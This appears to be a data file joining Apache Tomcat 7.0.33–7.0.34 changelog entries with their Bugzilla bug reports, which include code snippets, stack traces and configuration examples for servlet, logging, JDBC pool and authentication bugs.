The enclosed patch file is backward compatible and passes checkstyle."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54190
Catalina|Tomcat 7.0.34 (markt)|fix|54220|Ensure the ErrorReportValve only generates an error report if the error flag on the response has been set. (markt)|ErrorReportValve invoked on non-error responses too|"If you issue a response.setStatus(404) from a servlet, you expect as per spec that the response is left untouched. No error page written. There is sendError for that.

Unfortunately, ErrorReportValve reacts on line 158
> if ((statusCode < 400) || (response.getContentCount() > 0))
>            return;

If you take a look at the StandardHostValve, it invokes error handling on line 316
> if (!response.isError())
>            return;
On errors only (correct behavior).

The ErrorReportValve must react on response.isError() == true only. Regardless of the status code or the content count.
The Javadoc does not limit this to status codes >= 400 but is says that reponse.sendError() has to clears buffers. As far I understand that, regardless of the response body is disposed and the error reponse is always written."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54220
Catalina|Tomcat 7.0.34 (markt)|fix||Simplify time zone handling in the access log valve and correctly handle various edge cases for non-standard DST changes. (markt)|||
Web applications|Tomcat 7.0.34 (markt)|fix|54198|Clarify that HttpServletResponse.sendError(int) results in an HTML response by default. (markt)|Improve HttpServletResponse#sendError(int) JavaDoc description|"This methods calls sendError(int, null) internally. Thus generating a HTML page without a message. This is not mentioned in the docs. One could assume that the response will be empty.

One could duplicate the first paragraph of the sendError(int,String) method and alter it to ""The server defaults to creating the response to look like an HTML-formatted server error page with any specific message, setting the content type to ""text/html"",..."" further ""If an error-page declaration has been made for the web application corresponding to the status code passed in, it will be served back."" (Might need improvement in this case, I am not a native speaker).

Moreover, I would add ""This method is effectively the same as calling sendError(int, null)"". Plus add @see #sendError(int,String).

Though the JavaDocs seems to be a verbatim copy of Oracle's Servlet API, it does not reveal this information explicitly.

Should I provide a patch if that doc is available in svn.apache.org?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54198
Web applications|Tomcat 7.0.34 (markt)|fix|54207|Correct JNDI factory package name in Javadoc for org.apache.naming.java.javaURLContextFactory. (markt)|javaURLContextFactory javadoc refers to defunct package names in initial context properties|"Javadoc for org.apache.naming.java.javaURLContextFactory:

/**
 * Context factory for the ""java:"" namespace.
 * <p>
 * <b>Important note</b> : This factory MUST be associated with the ""java"" URL
 * prefix, which can be done by either :
 * <ul>
 * <li>Adding a 
 * java.naming.factory.url.pkgs=org.apache.catalina.util.naming property
 * to the JNDI properties file</li>
 * <li>Setting an environment variable named Context.URL_PKG_PREFIXES with 
 * its value including the org.apache.catalina.util.naming package name. 
 * More detail about this can be found in the JNDI documentation : 
 * {@link javax.naming.spi.NamingManager#getURLContext(java.lang.String, java.util.Hashtable)}.</li>
 * </ul>
 * 
 * @author Remy Maucherat
 * @version $Id$
 */

org.apache.catalina.util.naming is a very old package name.  The correct name for both TC6 and TC7 is org.apache.naming ."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54207
jdbc-pool|Tomcat 7.0.34 (markt)|code||Fix a handful of Eclipse warnings in the JDBC pool source code including the warnings reported in 53565. (markt)|deprecated|"\org\apache\tomcat\jdbc\pool\interceptor\SlowQueryReport.java:300: warning: [deprecation] toGMTString() in Date has been deprecated
            buf.append(new java.util.Date(maxInvocationDate).toGMTString());

\org\apache\tomcat\jdbc\pool\interceptor\SlowQueryReport.java:305: warning: [deprecation] toGMTString() in Date has been deprecated
            buf.append(new java.util.Date(minInvocationDate).toGMTString());



to solve a possible solution is:



public String toString() {
            DateFormat df = new SimpleDateFormat(""dd MMM yyyy kk:mm:ss z"");
            df.setTimeZone(TimeZone.getTimeZone(""GMT""));

            StringBuilder buf = new StringBuilder(""QueryStats[query:"");
            buf.append(query);
            buf.append("", nrOfInvocations:"");
            buf.append(nrOfInvocations);
            buf.append("", maxInvocationTime:"");
            buf.append(maxInvocationTime);
            buf.append("", maxInvocationDate:"");
            //buf.append(new java.util.Date(maxInvocationDate).toGMTString());
            buf.append(df.format(new java.util.Date(maxInvocationDate)));
            buf.append("", minInvocationTime:"");
            buf.append(minInvocationTime);
            buf.append("", minInvocationDate:"");
            //buf.append(new java.util.Date(minInvocationDate).toGMTString());
            buf.append(df.format(new java.util.Date(minInvocationDate)));
            buf.append("", totalInvocationTime:"");
            buf.append(totalInvocationTime);
            buf.append("", averageInvocationTime:"");"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53565
jdbc-pool|Tomcat 7.0.34 (markt)|fix|54150|Make sure that SlowQueryReportJmx mbean deregistered during webapp shutdown. Reported by Alex Franken. (kfujino)|SlowQueryReportJmx mbean deregistration failure due to NPE - properties not set during pool close callback|"Found while debugging version 7.0.29

I found that our SlowQueryReportJmx mbean was not being deregistered during webapp shutdown.  I tracked this down to a NPE.  The interceptor properties are not being set (as is done in setupConnection) prior to the pool close callback.

ConnectionPool.close(boolean) poolClosed callback produces NPE in SlowQueryReportJmx.
{code}
        PoolProperties.InterceptorDefinition[] proxies = getPoolProperties().getJdbcInterceptorsAsArray();
        for (int i=0; i<proxies.length; i++) {
            try {
                proxies[i].getInterceptorClass().newInstance().poolClosed(this);
            }catch (Exception x) {
                log.debug(""Unable to inform interceptor of pool closure."",x);
            }
        }
...
{code}

NPE in SlowQueryReportJmx - null.containsKey

{code}
    public ObjectName getObjectName(Class<?> clazz, String poolName) throws MalformedObjectNameException {
... NPE
        if (getProperties().containsKey(objectNameAttribute)) {
...
{code}

Sounds reasonable to set properties any time you need to instantiate interceptors.
As is done in ConnectionPool.init(PoolConfiguration)

{code}
                JdbcInterceptor interceptor = proxies[i].getInterceptorClass().newInstance();
                interceptor.setProperties(proxies[i].getProperties());
                interceptor.poolStarted(this);
{code}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54150
jdbc-pool|Tomcat 7.0.34 (markt)|fix|54194|Make sure that connection pool mbean is not registered when jmxEnabled is false. Patch provided by tobias.gierke. (kfujino)|NPE in DataSource.registerJmx() although DataSource is created with setJmxEnabled(false)|"Created attachment 29626 [details]
Patch against DataSource.java (rev 1412899) from /tomcat/tc7.0.x/trunk

The exception does not seem to have any impact (at least not for my application) on the connection pools functionality , it's merely a minor annoyance. 

The attached patch fixed the problem for me.

OS: Ubuntu 12.04 64-bit

JDK: 

java version ""1.7.0_09""
Java(TM) SE Runtime Environment (build 1.7.0_09-b05)
Java HotSpot(TM) 64-Bit Server VM (build 23.5-b02, mixed mode)

Version of tomcat-jdbc.jar: 7.0.33

I create the datasource inside a custom ObjectFactory (because I need to retrieve JDBC URL/username/password from a config file on the classpath):

Resources are configured inside tomcat/conf/context.xml as follows:
------------------------------------ 
<Resource name=""jdbc/db0""
          database=""db0""
          auth=""Container""
          type=""javax.sql.DataSource""          factory=""my.DatasourceResourceFactory"" />

<Resource name=""jdbc/db1""
          database=""db1""
          auth=""Container""
          type=""javax.sql.DataSource""
          factory=""my.DatasourceResourceFactory"" />

------------------------------------

I'm creating the datasource like so:

------------------------------------
    private DataSource createDataSource(String jdbcUrl,String username,String password) 
    {
        final PoolProperties p = new PoolProperties();
        p.setUrl( jdbcUrl );
        p.setDriverClassName(""org.postgresql.Driver"");
        p.setUsername( username );
        p.setPassword( password );      

        p.setJmxEnabled(false); // JMX disabled

        p.setTestWhileIdle(false);
        p.setTestOnBorrow(true);
        p.setValidationQuery(""SELECT 1"");
        p.setTestOnReturn(false);
        p.setValidationInterval(30000);
        p.setInitialSize(5); 
        p.setMaxActive(25);      
        p.setMinIdle(0); 
        p.setMaxIdle(8); 
        p.setTimeBetweenEvictionRunsMillis(30000);
        p.setMinEvictableIdleTimeMillis(30000);         
        p.setRemoveAbandonedTimeout(60);
        p.setLogAbandoned(false);
        p.setRemoveAbandoned(false);   p.setJdbcInterceptors(""org.apache.tomcat.jdbc.pool.interceptor.ConnectionState;org.apache.tomcat.jdbc.pool.interceptor.StatementFinalizer"");

        final DataSource datasource = new DataSource();
        datasource.setPoolProperties(p);
        return datasource;        
    }
------------------------------------

This is the exception showing up in the log file:

------------------------------------

2012-11-23 14:53:48,109 [pool-2-thread-1] ERROR org.apache.tomcat.jdbc.pool.DataSource  - Unable to register JDBC pool with JMX
java.lang.NullPointerException
        at org.apache.tomcat.jdbc.pool.DataSource.registerJmx(DataSource.java:135)
        at org.apache.tomcat.jdbc.pool.DataSource.preRegister(DataSource.java:102)
        at org.apache.tomcat.util.modeler.BaseModelMBean.preRegister(BaseModelMBean.java:1132)
        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.preRegister(DefaultMBeanServerInterceptor.java:1007)
        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerDynamicMBean(DefaultMBeanServerInterceptor.java:919)
        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerObject(DefaultMBeanServerInterceptor.java:900)
        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerMBean(DefaultMBeanServerInterceptor.java:324)
        at com.sun.jmx.mbeanserver.JmxMBeanServer.registerMBean(JmxMBeanServer.java:512)
        at org.apache.tomcat.util.modeler.Registry.registerComponent(Registry.java:742)
        at org.apache.catalina.core.NamingContextListener.addResource(NamingContextListener.java:1062)
        at org.apache.catalina.core.NamingContextListener.createNamingContext(NamingContextListener.java:671)
        at org.apache.catalina.core.NamingContextListener.lifecycleEvent(NamingContextListener.java:270)
        at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
        at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
        at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5161)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
        at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:895)
        at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:871)
        at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:615)
        at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:958)
        at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1599)
        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
        at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
        at java.util.concurrent.FutureTask.run(FutureTask.java:166)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
        at java.lang.Thread.run(Thread.java:722)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54194
Other|Tomcat 7.0.34 (markt)|update||Update to Eclipse JDT Compiler 4.2.1. (markt)|||
Catalina|Tomcat 7.0.33 (markt)|add||53960, 54115: Extensions to HttpClient test helper class. Patches by Brian Burch. (markt/kkolinko)|Extensions to HttpClient test helper class|"Created attachment 29443 [details]
Enhancements to HttpClient including preparation for no-cookie tests

Ref: ""FormAuthenticatorTest for cases without cookies - implementation issues"" on the tomcat dev list.

The attached patch prepares the HttpClient abstract helper ready for use by new Authenticator unit test cases. The change includes style cleanup, new public methods, logic refactoring and new private methods.

This change leaves the class 100% backward compatible with all existing unit tests.

When each of the concrete Authenticator tests are eventually extended, the new logic in HttpClient will be fully used for existing as well as new test cases."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53960
Catalina|Tomcat 7.0.33 (markt)|fix|53993|Avoid a possible NPE in the AccessLogValve when the session ID is logged and a session is invalidated. (markt)|NPE in AccessLogValve|"During a load test of tomcat 7.0.30, we occasionally see NPEs from the AccessLogValve.  Some of the requests that are being executed as part of the load test call HttpSession.invalidate.  I mention this because the code in question appears to be susceptible to multithreaded manipulation of the session.  I think the fix should be as simple as a check for null on the return value of request.getSessionInternal.

Of course, our access log pattern includes logging the session id.

java.lang.NullPointerException 
    org.‚Äãapache.‚Äãcatalina.‚Äãvalves.‚ÄãAccessLogValve$‚ÄãSessionIdElement.‚ÄãaddElement(‚ÄãAccessLogValve.java:1733) 
    org.apache.catalina.valves.AccessLogValve.log(AccessLogValve.java:955) 
    org.apache.catalina.core.AccessLogAdapter.log(AccessLogAdapter.java:51) 
    org.apache.catalina.core.StandardEngine.logAccess(StandardEngine.java:332) 
    org.apache.catalina.core.ContainerBase.logAccess(ContainerBase.java:1270) 
    org.apache.catalina.core.ContainerBase.logAccess(ContainerBase.java:1270) 
    org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:441) 
    org.‚Äãapache.‚Äãcoyote.‚Äãhttp11.‚ÄãAbstractHttp11Processor.‚Äãprocess(‚ÄãAbstractHttp11Processor.java:1002) 
    org.‚Äãapache.‚Äãcoyote.‚ÄãAbstractProtocol$‚ÄãAbstractConnectionHandler.‚Äãprocess(‚ÄãAbstractProtocol.java:585) 
    org.‚Äãapache.‚Äãtomcat.‚Äãutil.‚Äãnet.‚ÄãJIoEndpoint$‚ÄãSocketProcessor.‚Äãrun(‚ÄãJIoEndpoint.‚Äãjava:‚Äã312)‚Äã 
    java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110) 
    java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603) 
    java.lang.Thread.run(Thread.java:722)

existing code for convenience:

    protected static class SessionIdElement implements AccessLogElement {
        @Override
        public void addElement(StringBuilder buf, Date date, Request request,
                Response response, long time) {
            if (request != null) {
                if (request.getSession(false) != null) {
                    buf.append(request.getSessionInternal(false) // LINE 1733
                            .getIdInternal());
                } else {
                    buf.append('-');
                }
            } else {
                buf.append('-');
            }
        }
    }


possible fix:

...
                if (request.getSession(false) != null) {
                    Session internalSession = request.getSessionInternal(false);
                    if (internalSession != null) {
                        buf.append(internalSession.getIdInternal());
                    } else {
                        buf.append('-');
                    }
                } else {
                    buf.append('-');
                }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53993
Catalina|Tomcat 7.0.33 (markt)|fix||Add support for LAST_ACCESS_AT_START system property to PersistentManager. (kfujino)|||
Catalina|Tomcat 7.0.33 (markt)|add||Update MIME type mapping with additional / updated mime.types from the Apache web server. (markt)|||
Catalina|Tomcat 7.0.33 (markt)|fix|54007|Fix a memory leak that prevented deletion of a context.xml file associated with a Context that had failed to deploy. Also fix the problems uncovered with undeploying such a Context once the leak had been fixed and the file could be deleted. (markt)|Improve handling of failed web application deployments|"1) If Tomcat 6 runs with autodeployment being enabled, and a web application deployment fails, Tomcat will repeat attempts to autodeploy the application every 10 seconds. So every 10 seconds an error message is printed into the error log.

To reproduce: place a broken context xml file (e.g. with a typo) into conf/Catalina/localhost.

2) The input stream for the broken context xml file is not properly closed. When running on Windows the file cannot be deleted without stopping Tomcat.

3) If a broken web application is deployed via Manager web application GUI, it fails to deploy and it is not displayed in the list of the applications. 

As a consequence
- It cannot be undeployed via GUI, as it is absent from the list. If one crafts the command URL manually, it fails with
""FAIL - No context exists for path /test""
- It cannot be replaced with a new correct version of the application, because if you try to upload a new war, it fails with
""FAIL - War file ""test.war"" already exists on server""


Note, that in Tomcat 7 the issue has already been fixed in 7.0.23"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54007
Catalina|Tomcat 7.0.33 (markt)|fix|54044|Correct bug in timestamp cache used by logging (including the access log valve) that meant entries could be made with an earlier timestamp than the true timestamp. (markt)|AccessLogValve using stale date/time with SimpleDateFormat|"We are noticing old/stale date/times in out access logs. I copied (and scrubbed) the entries below from an access log from 2012-10-22.

...,2012-10-15 18:00:56.705-0500,""GET ...
...,2012-10-22 10:29:01.801-0500,""GET ...
...,2012-10-22 10:29:01.802-0500,""GET ...
...,2012-10-22 10:29:01.803-0500,""GET ...
...,2012-10-22 10:29:01.804-0500,""GET ...
...,2012-10-15 18:00:56.804-0500,""GET ...
...,2012-10-15 18:00:56.857-0500,""GET ...

We use using the SimpleDateFormat functionality and the beginTime prefix.  Our ""pattern"" is:

%{X-Tomcat-Session}i,%S,%{X-Forwarded-For}i,%h,%u,%{begin:yyyy-MM-dd HH:mm:ss.SSSZ}t,&quot;%r&quot;,%s,%b,%p,%{Referer}i,&quot;%{User-Agent}i&quot;,%T""

In the example above, jvm/tomcat instance was started on 2012-10-15 at 18:00:41 (a few seconds before the stuck time in the access log) so the  2012-10-15 18:00:56 times are likely related to some caching issues/problems.  We also occasionally see other log entries with incorrect (but not startup) dates/times.  For, example, we sometimes see yesterday's date in the access log.

Also, note that the millisecond times do appear to be correct in that they increase in a reasonable way and are unrelated to the date and second-truncated time."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54044
Catalina|Tomcat 7.0.33 (markt)|fix|54054|Do not share shell environment variables between multiple instances of the CGI servlet. (markt)|2 CGIServlet's with different Parameter passShellEnvironment|"Created attachment 29511 [details]
2 webapps test1/test2.

I'm running Tomcat 6.0.36 with Java 1.6.0_32 on Ubuntu 12.04 (64 Bit).

I have 2 webapps test1 and test2 which use CGI with CGIServlet.
The difference between test1 and test2 is the Parameter passShellEnvironment.
test1 sets it to true, test2 to false.
When I call .../cgi-bin/getenv.pl, both apps show the complete environment.
I searched the source of CGIServlet and found, that there is a static 
Hashtable: 
static Hashtable<String,String> shellEnv = new Hashtable<String,String>();

So test1 sets this Hashtable and test2 has it too.
I suggest to remove the static.
Then only test1 has the environment.

In Tomcat 7.0.32 the problem is the same."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54054
Catalina|Tomcat 7.0.33 (markt)|fix|54060|Use a simple parser rather than a regular expression to parse HTTP Digest authentication headers so the header is correctly parsed. The new approach is also faster and generates less garbage. (markt)|DigestAuthenticator doesn't parse Authorization header correctly|"From DigestAuthenticator at line 546

            // Bugzilla 37132: http://issues.apache.org/bugzilla/show_bug.cgi?id=37132
            String[] tokens = authorization.split("",(?=(?:[^\""]*\""[^\""]*\"")+$)"");

if the last term in the line is not enclosed in quotes, only a single 'term' results. For example:

Header: username=""mthornton"", qop=auth
token[0] is username=""mthornton"", qop=auth

Header: username=""mthornton"", qop=auth, cnonce=""9926cb3c334ede11""
token[0] is username=""mthornton""
token[1] is  qop=auth
token[2] is  cnonce=""9926cb3c334ede11""

(Headers abbreviated for clarity)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54060
Catalina|Tomcat 7.0.33 (markt)|fix|54068|Rewrite the web fragment ordering algorithm to resolve multiple issues that resulted in incorrect ordering or failure to find a correct, valid order. (markt)|Web fragment sorting incorrectly detects circular reference|"Created attachment 29522 [details]
Test case implementation

The implementation of web fragment sorting with relative ordering constraints may detect circular references, even though there is no such circle. 

This occurrence of this bug depends on the iteration order of the input map.

Consider the attached test case, defining a simple chain of three web fragments:
* web fragments a, b, c, with relative constraints ""b after a"", ""c after b"".
* expected result: a, b, c
* actual result: 

Testcase: testOrderWebFragmentsRelative4 took 0,002 sec
        Caused an ERROR
Fragment relative ordering contains circular references. Thsi can be resolved by using absolute ordering in web.xml.
java.lang.IllegalArgumentException: Fragment relative ordering contains circular references. Thsi can be resolved by using absolute ordering in web.xml.
        at org.apache.catalina.deploy.WebXml.orderWebFragments(WebXml.java:2190)
        at org.apache.catalina.deploy.TestWebXmlOrdering.testOrderWebFragmentsRelative4(TestWebXmlOrdering.java:268)

Workaround: use absolute ordering.

Details:
* Java 1.7.0_07"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54068
Catalina|Tomcat 7.0.33 (markt)|update||The HTTP header parser added to address 52811 has been removed and replaced with the light-weight HTTP header parser created to address 54060. The new parser includes a work-around for a bug in the Adobe Acrobat Reader 9.x plug-in for Microsoft Internet Explorer that was identified when the old parser was introduced (53814).|HttpServletResponse.setContentType() parses the content type incorrectly|"When creating the HttpServletResponse the setContentType(type) is used for setting the content type and character encoding.
If the type is for example:

multipart/related;boundary=1_4F50BD36_CDF8C28;Start=""<31671603.smil>"";Type=""application/smil;charset=UTF-8""

it is parsed and the content type is set to:

multipart/related;boundary=1_4F50BD36_CDF8C28;Start=""<31671603.smil>"";Type=""application/smil

and character encoding to:

UTF-8

I believe it is incorrect, the content type should be:

multipart/related;boundary=1_4F50BD36_CDF8C28;Start=""<31671603.smil>"";Type=""application/smil;charset=UTF-8""

and the character encoding should be set to default (ISO-8859-1)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52811
Catalina|Tomcat 7.0.33 (markt)|fix|54076|Add an alternative work-around for clients that use SPNEGO authentication and expect the authenticated user to be cached per connection (Tomcat only does this if an HTTP session is available). (markt)|SPNEGO authenticator's stateless-ness incompatible with stateful clients|"At the moment, Tomcat is not able to store connection-level information to support stateful authentication mechanisms. This has been confirmed on the mailinglist: http://www.mail-archive.com/users@tomcat.apache.org/msg102169.html

Unfortunately, a client which observes that, like Apache HTTPComponents or libserf (used in Apache Subversion) with authenticate only the first the request and expect the server to cache that for the connection. Subsequent comm will end in an endless loop. See here http://serf.googlecode.com/issues/attachment?aid=770006001&name=tomcat-serf-spnego-response.png&token=GDWvY5f7eMDzDGwtg1tD5N_MUXY%3A1351604707042&inline=1 and here http://serf.googlecode.com/issues/attachment?aid=770006002&name=serf-endless-loop.png&token=cHvvfubJuAHDuTMjG_OHOaps5hQ%3A1351604707042&inline=1

A simple hint can tell the client that the server does not support stateful auth on a connection-level. Add here http://svn.apache.org/viewvc/tomcat/tc7.0.x/trunk/java/org/apache/catalina/authenticator/SpnegoAuthenticator.java?view=markup#l272 before line 272 ""response.addHeader(""Connection"", ""close"");"" and the client will open a new connection and reauth further requests.

Not doing so makes the Tomcat server vulnerable to DoS as you can see in the second screenshot."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54076
Catalina|Tomcat 7.0.33 (markt)|fix|54087|Correctly handle (ignore) invalid If-Modified-Since header rather than throwing an exception. (markt)|HTTP Connector incorrectly throws Exception on Invalid If-Modified-Since Header|"Given this request:

Frame 6: 988 bytes on wire (7904 bits), 988 bytes captured (7904 bits)
Ethernet II, Src: Adtran_16:34:e9 (00:a0:c8:16:34:e9), Dst: Supermic_34:fe:a8 (00:30:48:34:fe:a8)
Internet Protocol Version 4, Src: 198.58.103.28 (198.58.103.28), Dst: 216.17.130.68 (216.17.130.68)
Transmission Control Protocol, Src Port: 37483 (37483), Dst Port: http (80), Seq: 1449, Ack: 1, Len: 922
[2 Reassembled TCP Segments (2370 bytes): #4(1448), #6(922)]
Hypertext Transfer Protocol
    GET /rss/calendar_id/2.xml HTTP/1.1\r\n
    Accept: application/atom+xml,application/rdf+xml,application/rss+xml,application/xml,text/xml,*/*\r\n
    Connection: close\r\n
    Accept-Encoding: gzip,deflate\r\n
    User-Agent: Superfeedr bot/2.0 http://superfeedr.com - Please get in touch if we are polling too hard.\r\n
    X-Superfeedr-Url: http://startupia.mhsoftware.com/rss/calendar_id/2.xml\r\n
    If-None-Match: ""1351656000000""\r\n
    If-Modified-Since: 2012-10-31 04:00:00 +0000\r\n
    host: startupia.mhsoftware.com\r\n
ofu.dpn=ffffffffc3a03c0245525d5f4f58455e445a4a4236
    \r\n
    [Full request URI: http://startupia.mhsoftware.com/rss/calendar_id/2.xml]
~                                                                               

Tomcat Throws the Exception:

2012-10-31 15:47:15,381 [http-80-46] ERROR org.apache.catalina.core.ContainerBase.[Catalina].[startupia.mhsoftware.com].[/].[RSSProcessor]- Servlet.service() for servlet RSSProcessor threw exception
java.lang.IllegalArgumentException: 2012-10-31 04:00:00 +0000
        at org.apache.catalina.connector.Request.getDateHeader(Request.java:1924)
        at org.apache.catalina.connector.RequestFacade.getDateHeader(RequestFacade.java:632)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:619)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
        at sun.reflect.GeneratedMethodAccessor72.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)

This is because the date for the If-Modified-Since Header (2012-10-31 04:00:00 +0000) is not in the format specified by RFC-2616 Section 3.3.1. However, the RFC states in section 14.25a:

if the passed If-Modified-Since date is invalid, the response is exactly the same as for a normal GET. A date which is later than the server's current time is invalid.

Tomcat is not complying with this aspect of the specification because it throws a 500 rather than processing it as described by the specification."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54087
Catalina|Tomcat 7.0.33 (markt)|fix|54096|In web.xml, <env-entry> should accept any type that has a constructor that takes a single String or char. (markt)|env-entry rejects legal types|"In servlet 3.0 the type in an env-entry can be any type which has a public constructor taking a single String (or character) as an argument. Tomcat only accepts a fixed list of types (see NamingContextListener from line 813).

This is legal in web.xml but not accepted by tomcat:

<env-entry>
  <env-entry-name>location</env-entry-name>
  <env-entry-type>java.io.File</env-entry-type>
  <env-entry-value>/var/lib/tomcat</env-entry-value>
</env-entry>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54096
Catalina|Tomcat 7.0.33 (markt)|add|54127|Add support for sending a WebSocket Ping. Patch provided by Sean Winterberger. (markt)|WsOutbound is missing a ping method|"Created attachment 29577 [details]
patch which adds ping functionality to WsOutbound

WsOutbound currently lacks the ability to send a ping request to the client.

Attached patch creates a new method pong which takes in a ByteBuffer and passes the ping byte (0x09) to sendControlMessage which sets the opcode byte on the frame.  Refactored pong method to all call sendControlMessage as opposed to duplicate code. 

Added websocket.Constants import for OPCODE_PING/PONG."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54127
Catalina|Tomcat 7.0.33 (markt)|fix||Fix CVE-2013-2067: In FormAuthenticator: If it is configured to change Session IDs, do the change before displaying the login form. (kkolinko)|||
Catalina|Tomcat 7.0.33 (markt)|fix||Ensure AsyncListener.timeout() and AsyncListener.complete() are called with the correct thread context class loader. (fhanik)|||
Catalina|Tomcat 7.0.33 (markt)|fix|54123|If an asynchronous request times out without any AsyncListeners defined, a 500 error will be triggered. (markt)|servlet 3.0 spec violation in async timeout processing|"Created attachment 29575 [details]
test war file within java source

Servlet 3.0 Spec. says that


2.3.3.3 Asynchronous processing

...

In the event that an asynchronous operation times out, the container must run 
through the following steps: 
‚ñ† Invoke the AsyncListener.onTimeout method on all the AsyncListener 
instances registered with the ServletRequest on which the asynchronous 
operation was initiated. 
‚ñ† If none of the listeners called AsyncContext.complete() or any of the 
AsyncContext.dispatch methods, perform an error dispatch with a status 
code equal to HttpServletResponse.SC_INTERNAL_SERVER_ERROR. 
‚ñ† If no matching error page was found, or the error page did not call 
AsyncContext.complete() or any of the AsyncContext.dispatch 
methods, the container MUST call AsyncContext.complete().

(servlet-3_0-mrel-spec.pdf / pdf page 40, Spec page 18)


In other words, if there are no AsyncListeners which calls AsyncContext.complete() or any of the 
AsyncContext.dispatch, the container must perform an error dispatch with 500 error code.

But tomcat 7 does not send 500 error response. It sends 200 OK.

In org.apache.catalina.core.AsyncContextImpl.timeout(), 

                if (listenerInvoked) {
                    request.getCoyoteRequest().action(
                            ActionCode.ASYNC_IS_TIMINGOUT, result);
                    return !result.get();
                } else {
                    // No listeners, container calls complete
                    complete();
                }

it just calls complete(). So I think it must be spec violation.


I've attached the test war file within a test source.
Test URL is http://localhost:8080/asyncTimeoutTest/AsyncTimeoutTestServlet ."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54123
Catalina|Tomcat 7.0.33 (markt)|fix|54124|Correct provided value of request attribute javax.servlet.async.request_uri and add missing request attribute javax.servlet.async.path_info. (markt)|wrong javax.servlet.async.request_uri information and javax.servlet.async.path_info is missing|"As it is clearly shown that

org.apache.catalina.core.AsyncContextImpl.dispatch(ServletContext, String)

    @Override
    public void dispatch(ServletContext context, String path) {
        if (log.isDebugEnabled()) {
            logDebug(""dispatch   "");
        }
        check();
        if (request.getAttribute(ASYNC_REQUEST_URI)==null) {
            request.setAttribute(ASYNC_REQUEST_URI, request.getRequestURI()+""?""+request.getQueryString());
            request.setAttribute(ASYNC_CONTEXT_PATH, request.getContextPath());
            request.setAttribute(ASYNC_SERVLET_PATH, request.getServletPath());
            request.setAttribute(ASYNC_QUERY_STRING, request.getQueryString());
        }
        ....
    }

the value of ASYNC_REQUEST_URI is not the same as request.getRequestURI().
They must be equal to each other as defined by Servlet 3.0, 9.7.2
Dispatched Request Parameters.

And ASYNC_PATH_INFO is missing."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54124
Catalina|Tomcat 7.0.33 (markt)|add||Add denyStatus initialization parameter to CsrfPreventionFilter, allowing to customize the HTTP status code used for denied requests. (kkolinko)|||
Catalina|Tomcat 7.0.33 (markt)|fix|54141|Increase the permitted number of nested Realm levels from 2 to 3 by default and make the limit configurable via a system property. (markt)|Configuration does not allow Realms to be nested more than 2 levels deep|"The use case is to have one Realm that is configured for lock-out with another that is not: the two should be combined together.

The obvious configuration attempt is this:

<CombinedRealm>
  <LockoutRealm>
     <DataSourceRealm/>
  </LockoutRealm>
  <UserDatabaseRealm/>
</CombinedRealm>

Unfortunately, this configuration yields an error:

  No rules found matching 'Server/Service/Engine/Realm/Realm/Realm'

org.apache.catalina.startup.RealmRuleSet.addRuleInstances only goes 2 levels deep when it comes to Realms (that is, only allows ""Realm"" and ""Realm/Realm""). Adding a 3rd level would certainly work here and might be sufficient. Another option would be to configure the digester to allow arbitrary levels of Realm-nesting for even the most pathological cases.

For reference, see this link to a question over on StackOverflow: http://stackoverflow.com/questions/13274696/tomcat-7-nesting-combinedrealm-lockoutrealm-and-datasourcerealm"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54141
Catalina|Tomcat 7.0.33 (markt)|fix||Revert occasional API change in BaseDirContext class that was done in 7.0.32. Methods should not be final. (kkolinko)|||
Catalina|Tomcat 7.0.33 (markt)|fix||Prevent failures in the AccessLogValve when running under a SecurityManager and the first request received is an asynchronous one. (markt)|||
Coyote|Tomcat 7.0.33 (markt)|fix||Correct an issue that prevented WebSockets from being used over SSL when using the HTTP NIO connector. (markt)|||
